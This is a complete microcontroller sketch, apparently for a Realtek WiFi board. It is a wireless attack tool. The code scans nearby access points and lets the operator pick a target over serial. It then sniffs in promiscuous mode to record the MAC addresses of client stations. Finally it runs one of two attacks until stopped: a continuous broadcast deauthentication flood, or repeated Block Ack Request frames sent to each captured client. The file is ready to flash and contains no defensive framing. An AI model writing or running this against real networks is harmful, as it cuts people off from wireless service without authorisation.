#include <WiFi.h>
#include <wifi_conf.h>
#include "wifi_cust_tx.h"
#include "wifi_misc.h"
#include "printf.h"

uint8_t n;

uint8_t choose(String msg){
  Serial.println(msg);
  while (!Serial.available()) vTaskDelay(100);
  return Serial.parseInt();
}

void sniffer(unsigned char *buf, unsigned int len, void* _) {
  _ = _; // nah i hate warnings
  len = len;
  ieee80211_frame_info_t *pkt = (ieee80211_frame_info_t*)buf;
  if (((pkt->i_fc & 0x0C) >> 2) != 2) return;

  uint8_t *senderMac = pkt->i_addr2, *receiverMac = pkt->i_addr1;
  if (!macValid(senderMac) || !macValid(receiverMac)) return;

  if (memcmp(senderMac, nwBSSID[n], 6) && memcmp(receiverMac, nwBSSID[n], 6)) return;
  uint8_t *staMac = memcmp(senderMac, nwBSSID[n], 6) ? senderMac : receiverMac;
  for (size_t i = 0; i < staMACCount; i++) if (!memcmp(staMac, staMAC[i], 6)) return;

  if (staMACCount < 25) memcpy(staMAC[staMACCount++], staMac, 6), printf("Found STA: "MACSTR"\n", MAC2STR(staMac));
}

void setup() {
  Serial.begin(115200);
  wifi_on(RTW_MODE_STA);
  scanAPs();
  n = choose("Target AP?");
  printf("%-30s RSSI: %-3ld Band: %s Channel: %-3u MAC: %s Encryption: %s\n", nwSSID[n], nwRSSI[n], (nwChannel[n] < 14 ? "2.4GHz" : "  5GHz"), nwChannel[n], nwMAC[n], nwSecurity[n]);
  Serial.println("Scanning for STAs...");

  wext_set_channel(WLAN0_NAME, nwChannel[n]);
  wifi_set_promisc(RTW_PROMISC_ENABLE_2, sniffer, 0);
}

void loop() {
  int c = choose("Choose Attack:\n0|Deauth Attack\n1|BAR Attack");
  
  if (c == 0) {
    Serial.println("\nStarting Deauth Attack...");
    while (Serial.available() <= 0) wifi_tx_deauth_frame(nwBSSID[n], (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", 0),vTaskDelay(pdMS_TO_TICKS(20));
    Serial.println("Stopping Deauth Attack...\n");
    Serial.read();
  }
  else if (c == 1){
    Serial.println("\nStarting BAR Attack...");
    while (Serial.available() <= 0) {for (uint i = 0;i <= staMACCount;i++) sendBAR(nwBSSID[n], staMAC[i]);vTaskDelay(pdMS_TO_TICKS(20));}
    Serial.println("Stopping BAR Attack...\n");
    Serial.read();
  }
  else Serial.println("Invalid Choose!");
}
